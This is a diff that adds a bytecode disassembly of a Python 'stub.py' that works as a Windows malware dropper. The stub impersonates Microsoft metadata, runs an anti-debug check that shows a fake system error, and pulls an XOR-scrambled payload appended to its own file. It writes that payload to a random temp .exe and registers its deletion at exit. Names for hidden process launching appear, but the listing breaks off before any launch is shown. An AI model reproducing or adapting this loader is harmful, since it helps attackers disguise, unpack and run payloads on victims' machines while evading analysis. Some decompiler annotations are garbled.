@@ -1,0 +1,769 @@
+# pydisasm version 6.1.8
+# Python bytecode 3.10 (3439)
+# Disassembled from Python 3.12.10 (tags/v3.12.10:0cc8128, Apr  8 2025, 12:21:36) [MSC v.1943 64 bit (AMD64)]
+# Timestamp in code: 0 (1970-01-01 09:00:00)
+# Source code size mod 2**32: 0 bytes
+# Method Name:       <module>
+# Filename:          stub.py
+# Argument count:    0
+# Position-only argument count: 0
+# Keyword-only arguments: 0
+# Number of locals:  0
+# Stack size:        4
+# Flags:             0x00000040 (NOFREE)
+# First Line:        1
+# Constants:
+#    0: 0
+#    1: None
+#    2: 'Windows 10.0.19045.3803'
+#    3: 'Microsoft Corporation'
+#    4: 'System Compatibility Module'
+#    5: '© Microsoft Corporation. All rights reserved.'
+#    6: 'Wubba Lubba Dub Dub'
+#    7: (165, 60, 255, 0, 85, 170)
+#    8: b'<<<PAYLOAD_START>>>'
+#    9: <Code310 code object junk_validate_system at 0x17ce4054410, file stub.py>, line 13
+#   10: 'junk_validate_system'
+#   11: <Code310 code object junk_check_platform at 0x17ce681ef90, file stub.py>, line 21
+#   12: 'junk_check_platform'
+#   13: 'data'
+#   14: 'return'
+#   15: <Code310 code object unscramble at 0x17ce681f170, file stub.py>, line 30
+#   16: 'unscramble'
+#   17: <Code310 code object show_fake_error at 0x17ce681f290, file stub.py>, line 36
+#   18: 'show_fake_error'
+#   19: <Code310 code object anti_debug_check at 0x17ce67bc4d0, file stub.py>, line 47
+#   20: 'anti_debug_check'
+#   21: <Code310 code object main at 0x17ce67be8d0, file stub.py>, line 52
+#   22: 'main'
+#   23: '__main__'
+# Names:
+#    0: os
+#    1: sys
+#    2: tempfile
+#    3: subprocess
+#    4: atexit
+#    5: ctypes
+#    6: random
+#    7: string
+#    8: struct
+#    9: FAKE_VERSION
+#   10: FAKE_COMPANY
+#   11: FAKE_DESC
+#   12: FAKE_COPY
+#   13: SIGNATURE
+#   14: XOR_KEY
+#   15: MARKER
+#   16: junk_validate_system
+#   17: junk_check_platform
+#   18: bytes
+#   19: unscramble
+#   20: show_fake_error
+#   21: anti_debug_check
+#   22: main
+#   23: __name__
+  2:           0 LOAD_CONST           (0) ; TOS = 0
+               2 LOAD_CONST           (None) ; TOS = None
+               4 IMPORT_NAME          (os) ; TOS = import_module(os)
+               6 STORE_NAME           (os) ; os = import_module(os)
+               8 LOAD_CONST           (0) ; TOS = 0
+              10 LOAD_CONST           (None) ; TOS = None
+              12 IMPORT_NAME          (sys) ; TOS = import_module(sys)
+              14 STORE_NAME           (sys) ; sys = import_module(sys)
+              16 LOAD_CONST           (0) ; TOS = 0
+              18 LOAD_CONST           (None) ; TOS = None
+              20 IMPORT_NAME          (tempfile) ; TOS = import_module(tempfile)
+              22 STORE_NAME           (tempfile) ; tempfile = import_module(tempfile)
+              24 LOAD_CONST           (0) ; TOS = 0
+              26 LOAD_CONST           (None) ; TOS = None
+              28 IMPORT_NAME          (subprocess) ; TOS = import_module(subprocess)
+              30 STORE_NAME           (subprocess) ; subprocess = import_module(subprocess)
+              32 LOAD_CONST           (0) ; TOS = 0
+              34 LOAD_CONST           (None) ; TOS = None
+              36 IMPORT_NAME          (atexit) ; TOS = import_module(atexit)
+              38 STORE_NAME           (atexit) ; atexit = import_module(atexit)
+              40 LOAD_CONST           (0) ; TOS = 0
+              42 LOAD_CONST           (None) ; TOS = None
+              44 IMPORT_NAME          (ctypes) ; TOS = import_module(ctypes)
+              46 STORE_NAME           (ctypes) ; ctypes = import_module(ctypes)
+              48 LOAD_CONST           (0) ; TOS = 0
+              50 LOAD_CONST           (None) ; TOS = None
+              52 IMPORT_NAME          (random) ; TOS = import_module(random)
+              54 STORE_NAME           (random) ; random = import_module(random)
+              56 LOAD_CONST           (0) ; TOS = 0
+              58 LOAD_CONST           (None) ; TOS = None
+              60 IMPORT_NAME          (string) ; TOS = import_module(string)
+              62 STORE_NAME           (string) ; string = import_module(string)
+              64 LOAD_CONST           (0) ; TOS = 0
+              66 LOAD_CONST           (None) ; TOS = None
+              68 IMPORT_NAME          (struct) ; TOS = import_module(struct)
+              70 STORE_NAME           (struct) ; struct = import_module(struct)
+
+  4:          72 LOAD_CONST           ("Windows 10.0.19045.3803") ; TOS = "Windows 10.0.19045.3803"
+              74 STORE_NAME           (FAKE_VERSION) ; FAKE_VERSION = "Windows 10.0.19045.3803"
+
+  5:          76 LOAD_CONST           ("Microsoft Corporation") ; TOS = "Microsoft Corporation"
+              78 STORE_NAME           (FAKE_COMPANY) ; FAKE_COMPANY = "Microsoft Corporation"
+
+  6:          80 LOAD_CONST           ("System Compatibility Module") ; TOS = "System Compatibility Module"
+              82 STORE_NAME           (FAKE_DESC) ; FAKE_DESC = "System Compatibility Module"
+
+  7:          84 LOAD_CONST           ("© Microsoft Corporation. All rights reserved.") ; TOS = "© Microsoft Corporation. All rights reserved."
+              86 STORE_NAME           (FAKE_COPY) ; FAKE_COPY = "© Microsoft Corporation. All rights reserved."
+
+  8:          88 LOAD_CONST           ("Wubba Lubba Dub Dub") ; TOS = "Wubba Lubba Dub Dub"
+              90 STORE_NAME           (SIGNATURE) ; SIGNATURE = "Wubba Lubba Dub Dub"
+
+ 10:          92 BUILD_LIST           0 ; TOS = []
+              94 LOAD_CONST           ((165, 60, 255, 0, 85, 170)) ; TOS = (165, 60, 255, 0, 85, 170)
+              96 LIST_EXTEND          1
+              98 STORE_NAME           (XOR_KEY)
+
+ 11:         100 LOAD_CONST           (b'<<<PAYLOAD_START>>>') ; TOS = b'<<<PAYLOAD_START>>>'
+             102 STORE_NAME           (MARKER) ; MARKER = b'<<<PAYLOAD_START>>>'
+
+ 13:         104 LOAD_CONST           (<Code310 code object junk_validate_system at 0x17ce4054410, file stub.py>, line 13) ; TOS = <Code310 code object junk_validate_system at 0x17ce4054410, file stub.py>, line 13
+             106 LOAD_CONST           ("junk_validate_system") ; TOS = "junk_validate_system"
+             108 MAKE_FUNCTION        (No arguments) ; TOS = def junk_validate_system(): ...
+             110 STORE_NAME           (junk_validate_system) ; junk_validate_system = def junk_validate_system(): ...
+
+ 21:         112 LOAD_CONST           (<Code310 code object junk_check_platform at 0x17ce681ef90, file stub.py>, line 21) ; TOS = <Code310 code object junk_check_platform at 0x17ce681ef90, file stub.py>, line 21
+             114 LOAD_CONST           ("junk_check_platform") ; TOS = "junk_check_platform"
+             116 MAKE_FUNCTION        (No arguments) ; TOS = def junk_check_platform(): ...
+             118 STORE_NAME           (junk_check_platform) ; junk_check_platform = def junk_check_platform(): ...
+
+ 30:         120 LOAD_CONST           ("data") ; TOS = "data"
+             122 LOAD_NAME            (bytes) ; TOS = bytes
+             124 LOAD_CONST           ("return") ; TOS = "return"
+             126 LOAD_NAME            (bytes) ; TOS = bytes
+             128 BUILD_TUPLE          4 ; TOS = ("data", bytes, "return", bytes)
+             130 LOAD_CONST           (<Code310 code object unscramble at 0x17ce681f170, file stub.py>, line 30) ; TOS = <Code310 code object unscramble at 0x17ce681f170, file stub.py>, line 30
+             132 LOAD_CONST           ("unscramble") ; TOS = "unscramble"
+             134 MAKE_FUNCTION        (annotation) ; TOS = def unscramble(...): ...
+             136 STORE_NAME           (unscramble) ; unscramble = def unscramble(...): ...
+
+ 36:         138 LOAD_CONST           (<Code310 code object show_fake_error at 0x17ce681f290, file stub.py>, line 36) ; TOS = <Code310 code object show_fake_error at 0x17ce681f290, file stub.py>, line 36
+             140 LOAD_CONST           ("show_fake_error") ; TOS = "show_fake_error"
+             142 MAKE_FUNCTION        (No arguments) ; TOS = def show_fake_error(): ...
+             144 STORE_NAME           (show_fake_error) ; show_fake_error = def show_fake_error(): ...
+
+ 47:         146 LOAD_CONST           (<Code310 code object anti_debug_check at 0x17ce67bc4d0, file stub.py>, line 47) ; TOS = <Code310 code object anti_debug_check at 0x17ce67bc4d0, file stub.py>, line 47
+             148 LOAD_CONST           ("anti_debug_check") ; TOS = "anti_debug_check"
+             150 MAKE_FUNCTION        (No arguments) ; TOS = def anti_debug_check(): ...
+             152 STORE_NAME           (anti_debug_check) ; anti_debug_check = def anti_debug_check(): ...
+
+ 52:         154 LOAD_CONST           (<Code310 code object main at 0x17ce67be8d0, file stub.py>, line 52) ; TOS = <Code310 code object main at 0x17ce67be8d0, file stub.py>, line 52
+             156 LOAD_CONST           ("main") ; TOS = "main"
+             158 MAKE_FUNCTION        (No arguments) ; TOS = def main(): ...
+             160 STORE_NAME           (main) ; main = def main(): ...
+
+ 95:         162 LOAD_NAME            (__name__) ; TOS = __name__
+             164 LOAD_CONST           ("__main__") ; TOS = "__main__"
+             166 COMPARE_OP           (==) ; TOS = __name__ == ("__main__")
+             168 POP_JUMP_IF_FALSE    (to 180) ; To line 95
+
+ 96:         170 LOAD_NAME            (main) ; TOS = main
+             172 CALL_FUNCTION        (0 positional arguments) ; TOS = main()
+             174 POP_TOP
+             176 LOAD_CONST           (None) ; TOS = None
+             178 RETURN_VALUE         return None
+
+ 95:     >>  180 LOAD_CONST           (None) ; TOS = None
+             182 RETURN_VALUE         return None
+
+
+# Method Name:       junk_validate_system
+# Filename:          stub.py
+# Argument count:    0
+# Position-only argument count: 0
+# Keyword-only arguments: 0
+# Number of locals:  3
+# Stack size:        4
+# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)
+# First Line:        13
+# Constants:
+#    0: None
+#    1: 0
+#    2: 1000
+#    3: 666
+#    4: 4294967295L
+# Names:
+#    0: range
+#    1: SIGNATURE
+# Varnames:
+#	result, i, _
+# Local variables:
+#    0: result
+#    1: i
+#    2: _
+ 14:           0 LOAD_CONST           (0) ; TOS = 0
+               2 STORE_FAST           (result) ; result = 0
+
+ 15:           4 LOAD_GLOBAL          (range) ; TOS = range
+               6 LOAD_CONST           (1000) ; TOS = 1000
+               8 CALL_FUNCTION        (1 positional argument) ; TOS = range(1000)
+              10 GET_ITER
+         >>   12 FOR_ITER             (to 42) ; To line 19
+              14 STORE_FAST           (i)
+
+ 16:          16 LOAD_FAST            (result) ; TOS = result
+              18 LOAD_FAST            (i) ; TOS = i
+              20 LOAD_FAST            (i) ; TOS = i
+              22 BINARY_MULTIPLY      TOS = i * (i)
+              24 INPLACE_ADD          TOS = result += (i * (i))
+              26 STORE_FAST           (result) ; result += (i * (i))
+
+ 17:          28 LOAD_FAST            (i) ; TOS = i
+              30 LOAD_CONST           (666) ; TOS = 666
+              32 COMPARE_OP           (==) ; TOS = i == (666)
+              34 POP_JUMP_IF_FALSE    (to 40)
+
+ 18:          36 LOAD_GLOBAL          (SIGNATURE) ; TOS = SIGNATURE
+              38 STORE_FAST           (_) ; _ = SIGNATURE
+         >>   40 JUMP_ABSOLUTE        (to 12)
+
+ 19:     >>   42 LOAD_FAST            (result) ; TOS = result
+              44 LOAD_CONST           (4294967295L) ; TOS = 4294967295L
+              46 BINARY_AND           TOS = result & (4294967295L)
+              48 RETURN_VALUE         return result & (4294967295L)
+
+
+# Method Name:       junk_check_platform
+# Filename:          stub.py
+# Argument count:    0
+# Position-only argument count: 0
+# Keyword-only arguments: 0
+# Number of locals:  3
+# Stack size:        2
+# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)
+# First Line:        21
+# Constants:
+#    0: None
+#    1: 255
+#    2: 6
+#    3: False
+#    4: 50000
+#    5: 2
+#    6: True
+# Names:
+#    0: ctypes
+#    1: windll
+#    2: kernel32
+#    3: GetVersion
+#    4: range
+# Varnames:
+#	version, major, _
+# Local variables:
+#    0: version
+#    1: major
+#    2: _
+ 22:           0 LOAD_GLOBAL          (ctypes) ; TOS = ctypes
+               2 LOAD_ATTR            (windll) ; TOS = ctypes.windll
+               4 LOAD_ATTR            (kernel32) ; TOS = ctypes.windll.kernel32
+               6 LOAD_METHOD          (GetVersion) ; TOS = ctypes.windll.kernel32.GetVersion
+               8 CALL_METHOD          (0 positional arguments) ; TOS = ctypes.windll.kernel32.GetVersion()
+              10 STORE_FAST           (version) ; version = ctypes.windll.kernel32.GetVersion()
+
+ 23:          12 LOAD_FAST            (version) ; TOS = version
+              14 LOAD_CONST           (255) ; TOS = 255
+              16 BINARY_AND           TOS = version & (255)
+              18 STORE_FAST           (major) ; major = version & (255)
+
+ 24:          20 LOAD_FAST            (major) ; TOS = major
+              22 LOAD_CONST           (6) ; TOS = 6
+              24 COMPARE_OP           (<) ; TOS = major < (6)
+              26 POP_JUMP_IF_FALSE    (to 32) ; To line 26
+
+ 25:          28 LOAD_CONST           (False) ; TOS = False
+              30 RETURN_VALUE         return False
+
+ 26:     >>   32 LOAD_GLOBAL          (range) ; TOS = range
+              34 LOAD_CONST           (50000) ; TOS = 50000
+              36 CALL_FUNCTION        (1 positional argument) ; TOS = range(50000)
+              38 GET_ITER
+         >>   40 FOR_ITER             (to 50) ; To line 28
+              42 STORE_FAST           (_)
+
+ 27:          44 LOAD_CONST           (2) ; TOS = 2
+              46 STORE_FAST           (_) ; _ = 2
+              48 JUMP_ABSOLUTE        (to 40)
+
+ 28:     >>   50 LOAD_CONST           (True) ; TOS = True
+              52 RETURN_VALUE         return True
+
+
+# Method Name:       unscramble
+# Filename:          stub.py
+# Argument count:    1
+# Position-only argument count: 0
+# Keyword-only arguments: 0
+# Number of locals:  4
+# Stack size:        6
+# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)
+# First Line:        30
+# Constants:
+#    0: None
+#    1: -1
+# Names:
+#    0: bytearray
+#    1: len
+#    2: enumerate
+#    3: XOR_KEY
+#    4: bytes
+# Varnames:
+#	data, temp, i, b
+# Positional arguments:
+#	data
+# Local variables:
+#    1: temp
+#    2: i
+#    3: b
+ 31:           0 LOAD_GLOBAL          (bytearray) ; TOS = bytearray
+               2 LOAD_GLOBAL          (len) ; TOS = len
+               4 LOAD_FAST            (data) ; TOS = data
+               6 CALL_FUNCTION        (1 positional argument) ; TOS = len(data)
+               8 CALL_FUNCTION        (1 positional argument) ; TOS = bytearray(len(data))
+              10 STORE_FAST           (temp) ; temp = bytearray(len(data))
+
+ 32:          12 LOAD_GLOBAL          (enumerate) ; TOS = enumerate
+              14 LOAD_FAST            (data) ; TOS = data
+              16 CALL_FUNCTION        (1 positional argument) ; TOS = enumerate(data)
+              18 GET_ITER
+         >>   20 FOR_ITER             (to 54) ; To line 34
+              22 UNPACK_SEQUENCE      2
+              24 STORE_FAST           (i)
+              26 STORE_FAST           (b)
+
+ 33:          28 LOAD_FAST            (b) ; TOS = b
+              30 LOAD_GLOBAL          (XOR_KEY) ; TOS = XOR_KEY
+              32 LOAD_FAST            (i) ; TOS = i
+              34 LOAD_GLOBAL          (len) ; TOS = len
+              36 LOAD_GLOBAL          (XOR_KEY) ; TOS = XOR_KEY
+              38 CALL_FUNCTION        (1 positional argument) ; TOS = len(XOR_KEY)
+              40 BINARY_MODULO        TOS = i % (len(XOR_KEY))
+              42 BINARY_SUBSCR        TOS = XOR_KEY[i % (len(XOR_KEY))]
+              44 BINARY_XOR           TOS = b ^ (XOR_KEY[i % (len(XOR_KEY))])
+              46 LOAD_FAST            (temp) ; TOS = temp
+              48 LOAD_FAST            (i) ; TOS = i
+              50 STORE_SUBSCR         temp[i] = XOR_KEY[i % (len(XOR_KEY))]
+              52 JUMP_ABSOLUTE        (to 20)
+
+ 34:     >>   54 LOAD_GLOBAL          (bytes) ; TOS = bytes
+              56 LOAD_FAST            (temp) ; TOS = temp
+              58 LOAD_CONST           (None) ; TOS = None
+              60 LOAD_CONST           (None) ; TOS = None
+              62 LOAD_CONST           (-1) ; TOS = -1
+              64 BUILD_SLICE          3
+              66 BINARY_SUBSCR        TOS = -1[]
+              68 CALL_FUNCTION        (1 positional argument) ; TOS = None(-1[])
+              70 RETURN_VALUE         return None(-1[])
+
+
+# Method Name:       show_fake_error
+# Filename:          stub.py
+# Argument count:    0
+# Position-only argument count: 0
+# Keyword-only arguments: 0
+# Number of locals:  0
+# Stack size:        6
+# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)
+# First Line:        36
+# Constants:
+#    0: None
+#    1: 0
+#    2: 'The application failed to initialize properly.\nError code: 0xC0000005.\nPlease verify that your system meets the minimum requirements.\n\nWubba Lubba Dub Dub'
+#    3: 'Windows System Error'
+#    4: 16
+# Names:
+#    0: ctypes
+#    1: windll
+#    2: user32
+#    3: MessageBoxW
+ 37:           0 LOAD_GLOBAL          (ctypes) ; TOS = ctypes
+               2 LOAD_ATTR            (windll) ; TOS = ctypes.windll
+               4 LOAD_ATTR            (user32) ; TOS = ctypes.windll.user32
+               6 LOAD_METHOD          (MessageBoxW) ; TOS = ctypes.windll.user32.MessageBoxW
+
+ 38:           8 LOAD_CONST           (0) ; TOS = 0
+
+ 39:          10 LOAD_CONST           ("The application failed to initialize properly.\nError code: 0xC0000005.\nPlease verify that your system meets the minimum requirements.\n\nWubba Lubba Dub Dub") ; TOS = "The application failed to initialize properly.\nError code: 0xC0000005.\nPlease verify that your system meets the minimum requirements.\n\nWubba Lubba Dub Dub"
+
+ 43:          12 LOAD_CONST           ("Windows System Error") ; TOS = "Windows System Error"
+
+ 44:          14 LOAD_CONST           (16) ; TOS = 16
+
+ 37:          16 CALL_METHOD          (4 positional arguments) ; TOS = ctypes.windll.user32.MessageBoxW(0, "The application failed to initialize properly.\nError code: 0xC0000005.\nPlease verify that your system meets the minimum requirements.\n\nWubba Lubba Dub Dub", "Windows System Error", 16)
+              18 POP_TOP
+              20 LOAD_CONST           (None) ; TOS = None
+              22 RETURN_VALUE         return None
+
+
+# Method Name:       anti_debug_check
+# Filename:          stub.py
+# Argument count:    0
+# Position-only argument count: 0
+# Keyword-only arguments: 0
+# Number of locals:  0
+# Stack size:        3
+# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)
+# First Line:        47
+# Constants:
+#    0: None
+#    1: 0
+# Names:
+#    0: ctypes
+#    1: windll
+#    2: kernel32
+#    3: IsDebuggerPresent
+#    4: show_fake_error
+#    5: sys
+#    6: exit
+ 48:           0 LOAD_GLOBAL          (ctypes) ; TOS = ctypes
+               2 LOAD_ATTR            (windll) ; TOS = ctypes.windll
+               4 LOAD_ATTR            (kernel32) ; TOS = ctypes.windll.kernel32
+               6 LOAD_METHOD          (IsDebuggerPresent) ; TOS = ctypes.windll.kernel32.IsDebuggerPresent
+               8 CALL_METHOD          (0 positional arguments) ; TOS = ctypes.windll.kernel32.IsDebuggerPresent()
+              10 LOAD_CONST           (0) ; TOS = 0
+              12 COMPARE_OP           (!=) ; TOS = ctypes.windll.kernel32.IsDebuggerPresent() != (0)
+              14 POP_JUMP_IF_FALSE    (to 36) ; To line 48
+
+ 49:          16 LOAD_GLOBAL          (show_fake_error) ; TOS = show_fake_error
+              18 CALL_FUNCTION        (0 positional arguments) ; TOS = show_fake_error()
+              20 POP_TOP
+
+ 50:          22 LOAD_GLOBAL          (sys) ; TOS = sys
+              24 LOAD_METHOD          (exit) ; TOS = sys.exit
+              26 LOAD_CONST           (0) ; TOS = 0
+              28 CALL_METHOD          (1 positional argument) ; TOS = sys.exit(0)
+              30 POP_TOP
+              32 LOAD_CONST           (None) ; TOS = None
+              34 RETURN_VALUE         return None
+
+ 48:     >>   36 LOAD_CONST           (None) ; TOS = None
+              38 RETURN_VALUE         return None
+
+
+# Method Name:       main
+# Filename:          stub.py
+# Argument count:    0
+# Position-only argument count: 0
+# Keyword-only arguments: 0
+# Number of locals:  10
+# Stack size:        8
+# Flags:             0x00000003 (NEWLOCALS | OPTIMIZED)
+# First Line:        52
+# Constants:
+#    0: None
+#    1: 0
+#    2: 'rb'
+#    3: 1
+#    4: 4
+#    5: '<I'
+#    6: ''
+#    7: 8
+#    8: ('k',)
+#    9: 'tmp_'
+#   10: '.exe'
+#   11: 'wb'
+#   12: <Code310 code object delete_payload at 0x17ce681f650, file stub.py>, line 79
+#   13: 'main.<locals>.delete_payload'
+#   14: False
+#   15: ('startupinfo', 'creationflags', 'shell')
+# Names:
+#    0: anti_debug_check
+#    1: junk_validate_system
+#    2: junk_check_platform
+#    3: open
+#    4: sys
+#    5: argv
+#    6: read
+#    7: MARKER
+#    8: split
+#    9: len
+#   10: struct
+#   11: unpack
+#   12: unscramble
+#   13: tempfile
+#   14: gettempdir
+#   15: join
+#   16: random
+#   17: choices
+#   18: string
+#   19: ascii_lowercase
+#   20: digits
+#   21: os
+#   22: path
+#   23: write
+#   24: atexit
+#   25: register
+#   26: subprocess
+#   27: STARTUPINFO
+#   28: dwFlags
+#   29: STARTF_USESHOWWINDOW
+#   30: Popen
+#   31: CREATE_NO_WINDOW
+# Varnames:
+#	f, self_data, rest, payload_len, scrambled, payload, temp_dir, rand_name, delete_payload, startupinfo
+# Local variables:
+#    0: f
+#    1: self_data
+#    2: rest
+#    3: payload_len
+#    4: scrambled
+#    5: payload
+#    6: temp_dir
+#    7: rand_name
+#    8: delete_payload
+#    9: startupinfo
+# Cell variables:
+#    0: temp_exe
+ 53:           0 LOAD_GLOBAL          (anti_debug_check) ; TOS = anti_debug_check
+               2 CALL_FUNCTION        (0 positional arguments) ; TOS = anti_debug_check()
+               4 POP_TOP
+
+ 54:           6 LOAD_GLOBAL          (junk_validate_system) ; TOS = junk_validate_system
+               8 CALL_FUNCTION        (0 positional arguments) ; TOS = junk_validate_system()
+              10 POP_TOP
+
+ 55:          12 LOAD_GLOBAL          (junk_check_platform) ; TOS = junk_check_platform
+              14 CALL_FUNCTION        (0 positional arguments) ; TOS = junk_check_platform()
+              16 POP_TOP
+
+ 57:          18 LOAD_GLOBAL          (open) ; TOS = open
+              20 LOAD_GLOBAL          (sys) ; TOS = sys
+              22 LOAD_ATTR            (argv) ; TOS = sys.argv
+              24 LOAD_CONST           (0) ; TOS = 0
+              26 BINARY_SUBSCR        TOS = sys.argv[0]
+              28 LOAD_CONST           ("rb") ; TOS = "rb"
+              30 CALL_FUNCTION        (2 positional arguments) ; TOS = open(sys.argv[0], "rb")
+              32 SETUP_WITH           (to 58)
+              34 STORE_FAST           (f)
+
+ 58:          36 LOAD_FAST            (f) ; TOS = f
+              38 LOAD_METHOD          (read) ; TOS = f.read
+              40 CALL_METHOD          (0 positional arguments) ; TOS = f.read()
+              42 STORE_FAST           (self_data) ; self_data = f.read()
+              44 POP_BLOCK
+
+ 57:          46 LOAD_CONST           (None) ; TOS = None
+              48 DUP_TOP              push(None)
+              50 DUP_TOP              push(push(None) )
+              52 CALL_FUNCTION        (3 positional arguments)
+              54 POP_TOP
+              56 JUMP_FORWARD         (to 74) ; To line 59
+         >>   58 WITH_EXCEPT_START
+              60 POP_JUMP_IF_TRUE     (to 64)
+              62 RERAISE              1
+         >>   64 POP_TOP
+              66 POP_TOP
+              68 POP_TOP
+              70 POP_EXCEPT
+              72 POP_TOP
+
+ 59:     >>   74 LOAD_GLOBAL          (MARKER) ; TOS = MARKER
+              76 LOAD_FAST            (self_data) ; TOS = self_data
+              78 CONTAINS_OP          (not in) ; TOS = MARKER not in self_data
+              80 POP_JUMP_IF_FALSE    (to 86) ; To line 63
+
+ 60:          82 LOAD_CONST           (None) ; TOS = None
+              84 RETURN_VALUE         return None
+
+ 63:     >>   86 LOAD_FAST            (self_data) ; TOS = self_data
+              88 LOAD_METHOD          (split) ; TOS = self_data.split
+              90 LOAD_GLOBAL          (MARKER) ; TOS = MARKER
+              92 LOAD_CONST           (1) ; TOS = 1
+              94 CALL_METHOD          (2 positional arguments) ; TOS = self_data.split(MARKER, 1)
+              96 LOAD_CONST           (1) ; TOS = 1
+              98 BINARY_SUBSCR        TOS = self_data.split(MARKER, 1)[1]
+             100 STORE_FAST           (rest) ; rest = self_data.split(MARKER, 1)[1]
+
+ 64:         102 LOAD_GLOBAL          (len) ; TOS = len
+             104 LOAD_FAST            (rest) ; TOS = rest
+             106 CALL_FUNCTION        (1 positional argument) ; TOS = len(rest)
+             108 LOAD_CONST           (4) ; TOS = 4
+             110 COMPARE_OP           (<) ; TOS = len(rest) < (4)
+             112 POP_JUMP_IF_FALSE    (to 118) ; To line 66
+
+ 65:         114 LOAD_CONST           (None) ; TOS = None
+             116 RETURN_VALUE         return None
+
+ 66:     >>  118 LOAD_GLOBAL          (struct) ; TOS = struct
+             120 LOAD_METHOD          (unpack) ; TOS = struct.unpack
+             122 LOAD_CONST           ("<I") ; TOS = "<I"
+             124 LOAD_FAST            (rest) ; TOS = rest
+             126 LOAD_CONST           (None) ; TOS = None
+             128 LOAD_CONST           (4) ; TOS = 4
+             130 BUILD_SLICE          2
+             132 BINARY_SUBSCR        TOS = 4[]
+             134 CALL_METHOD          (2 positional arguments)
+             136 LOAD_CONST           (0) ; TOS = 0
+             138 BINARY_SUBSCR        TOS = 2 positional arguments[0]
+             140 STORE_FAST           (payload_len) ; payload_len = 2 positional arguments[0]
+
+ 67:         142 LOAD_FAST            (rest) ; TOS = rest
+             144 LOAD_CONST           (4) ; TOS = 4
+             146 LOAD_CONST           (4) ; TOS = 4
+             148 LOAD_FAST            (payload_len) ; TOS = payload_len
+             150 BINARY_ADD           TOS = 4 + (payload_len)
+             152 BUILD_SLICE          2
+             154 BINARY_SUBSCR        TOS = 4 + (payload_len)[]
+             156 STORE_FAST           (scrambled) ; scrambled = 4 + (payload_len)[]
+
+ 68:         158 LOAD_GLOBAL          (len) ; TOS = len
+             160 LOAD_FAST            (scrambled) ; TOS = scrambled
+             162 CALL_FUNCTION        (1 positional argument) ; TOS = len(scrambled)
+             164 LOAD_FAST            (payload_len) ; TOS = payload_len
+             166 COMPARE_OP           (!=) ; TOS = len(scrambled) != (payload_len)
+             168 POP_JUMP_IF_FALSE    (to 174) ; To line 71
+
+ 69:         170 LOAD_CONST           (None) ; TOS = None
+             172 RETURN_VALUE         return None
+
+ 71:     >>  174 LOAD_GLOBAL          (unscramble) ; TOS = unscramble
+             176 LOAD_FAST            (scrambled) ; TOS = scrambled
+             178 CALL_FUNCTION        (1 positional argument) ; TOS = unscramble(scrambled)
+             180 STORE_FAST           (payload) ; payload = unscramble(scrambled)
+
+ 73:         182 LOAD_GLOBAL          (tempfile) ; TOS = tempfile
+             184 LOAD_METHOD          (gettempdir) ; TOS = tempfile.gettempdir
+             186 CALL_METHOD          (0 positional arguments) ; TOS = tempfile.gettempdir()
+             188 STORE_FAST           (temp_dir) ; temp_dir = tempfile.gettempdir()
+
+ 74:         190 LOAD_CONST           ("") ; TOS = ""
+             192 LOAD_METHOD          (join) ; TOS = "".join
+             194 LOAD_GLOBAL          (random) ; TOS = random
+             196 LOAD_ATTR            (choices) ; TOS = random.choices
+             198 LOAD_GLOBAL          (string) ; TOS = string
+             200 LOAD_ATTR            (ascii_lowercase) ; TOS = string.ascii_lowercase
+             202 LOAD_GLOBAL          (string) ; TOS = string
+             204 LOAD_ATTR            (digits) ; TOS = string.digits
+             206 BINARY_ADD           TOS = string.ascii_lowercase + (string.digits)
+             208 LOAD_CONST           (8) ; TOS = 8
+             210 LOAD_CONST           (('k',)) ; TOS = ('k',)
+             212 CALL_FUNCTION_KW     (2 total positional and keyword args)
+             214 CALL_METHOD          (1 positional argument)
+             216 STORE_FAST           (rand_name)
+
+ 75:         218 LOAD_GLOBAL          (os) ; TOS = os
+             220 LOAD_ATTR            (path) ; TOS = os.path
+             222 LOAD_METHOD          (join) ; TOS = os.path.join
+             224 LOAD_FAST            (temp_dir) ; TOS = temp_dir
+             226 LOAD_CONST           ("tmp_") ; TOS = "tmp_"
+             228 LOAD_FAST            (rand_name) ; TOS = rand_name
+             230 FORMAT_VALUE         0 ; TOS = f"{rand_name}"
+             232 LOAD_CONST           (".exe") ; TOS = ".exe"
+             234 BUILD_STRING         3 ; TOS = f".exe{rand_name}tmp_"
+             236 CALL_METHOD          (2 positional arguments) ; TOS = os.path.join(temp_dir, f".exe{rand_name}tmp_")
+             238 STORE_DEREF          (temp_exe) ; temp_exe = os.path.join(temp_dir, f".exe{rand_name}tmp_")
+
+ 76:         240 LOAD_GLOBAL          (open) ; TOS = open
+             242 LOAD_DEREF           (temp_exe) ; TOS = temp_exe
+             244 LOAD_CONST           ("wb") ; TOS = "wb"
+             246 CALL_FUNCTION        (2 positional arguments) ; TOS = open(temp_exe, "wb")
+             248 SETUP_WITH           (to 276)
+             250 STORE_FAST           (f)
+
+ 77:         252 LOAD_FAST            (f) ; TOS = f
+             254 LOAD_METHOD          (write) ; TOS = f.write
+             256 LOAD_FAST            (payload) ; TOS = payload
+             258 CALL_METHOD          (1 positional argument) ; TOS = f.write(payload)
+             260 POP_TOP
+             262 POP_BLOCK
+
+ 76:         264 LOAD_CONST           (None) ; TOS = None
+             266 DUP_TOP              push(None)
+             268 DUP_TOP              push(push(None) )
+             270 CALL_FUNCTION        (3 positional arguments) ; TOS = f.write(payload)(, , push(push(None) ) )
+             272 POP_TOP
+             274 JUMP_FORWARD         (to 292) ; To line 79
+         >>  276 WITH_EXCEPT_START
+             278 POP_JUMP_IF_TRUE     (to 282)
+             280 RERAISE              1
+         >>  282 POP_TOP
+             284 POP_TOP
+             286 POP_TOP
+             288 POP_EXCEPT
+             290 POP_TOP
+
+ 79:     >>  292 LOAD_CLOSURE         (temp_exe) ; temp_exe
+             294 BUILD_TUPLE          1
+             296 LOAD_CONST           (<Code310 code object delete_payload at 0x17ce681f650, file stub.py>, line 79) ; TOS = <Code310 code object delete_payload at 0x17ce681f650, file stub.py>, line 79
+             298 LOAD_CONST           ("main.<locals>.delete_payload") ; TOS = "main.<locals>.delete_payload"
+             300 MAKE_FUNCTION        (closure) ; TOS = def delete_payload(): ...
+             302 STORE_FAST           (delete_payload) ; delete_payload = def delete_payload(): ...
+
+ 84:         304 LOAD_GLOBAL          (atexit) ; TOS = atexit
+             306 LOAD_METHOD          (register) ; TOS = atexit.register
+             308 LOAD_FAST            (delete_payload) ; TOS = delete_payload
